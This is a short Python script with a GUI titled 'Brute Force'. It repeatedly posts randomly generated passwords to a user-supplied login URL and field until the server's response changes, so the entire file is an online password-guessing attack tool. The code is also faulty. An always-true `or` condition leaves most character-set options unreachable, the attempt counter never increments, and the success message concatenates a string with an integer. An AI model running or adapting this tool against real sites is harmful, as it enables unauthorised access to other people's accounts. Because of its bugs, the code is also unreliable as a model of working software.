# -*- coding: utf-8 -*-
# pip install
# requests
# random-password-generator
# char is for what letters to add for example:
# L = lower cased letter
# U = upper cased letter
# D = digits aka numbers
import requests
from password_generator import PasswordGenerator
import PySimpleGUI as sg

layout = [
    [sg.Text('URL', size=(11, 1)), sg.InputText('', size=(23, 1))],
    [sg.Text('Value', size=(11, 1)), sg.InputText('', size=(23, 1))],
    [sg.Text('Length', size=(11, 1)), sg.InputText('', size=(23, 1))],
    [sg.Text('Param', size=(11, 1)), sg.InputText('', size=(23, 1))],
    [sg.Submit(button_text='go')]
]

window = sg.Window('Brute Force', layout)

def gen(i, param):
  pwo = PasswordGenerator()
  if param == "U":
    return pwo.shuffle_password('ABCDEFGHIJKLMNOPQRSTUVWXYZ', i)
  elif param == "L":
    return pwo.shuffle_password('abcdefghijklmnopqrstuvwxyz', i)
  elif param == "D":
    return pwo.shuffle_password('1234567890', i)
  elif param == "LD" or "DL":
    return pwo.shuffle_password('abcdefghijklmnopqrstuvwxyz1234567890', i)
  elif param == "UD" or "DU":
    return pwo.shuffle_password('ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890', i)
  elif param == "UL" or "LU":
    return pwo.shuffle_password('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz', i)
  else:
    return pwo.shuffle_password("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890", i)

def bruteforce(url, value, length, param):
  count = 0
  while True:
    pas = gen(length, param)
    print(pas)
    message = {value: pas}
    req = requests.post(url, data=message)
    message2 = {value: " "}
    get = requests.post(url, data=message2)
    count +1
    if get.text != req.text:
      print("---------------")
      print(req)
      print("Password: ", pas, "Count: ", count)
      print("Success", "Found password: " + pas, "after" + count + "times")

      break

while True:
    event, values = window.read()

    if event is None:
      print('exit')
      break

    if event == "go":
      url = values[0]
      value = values[1]
      length = int(values[2])
      param = values[3]
      
      bruteforce(url, value, length, param)

window.close()
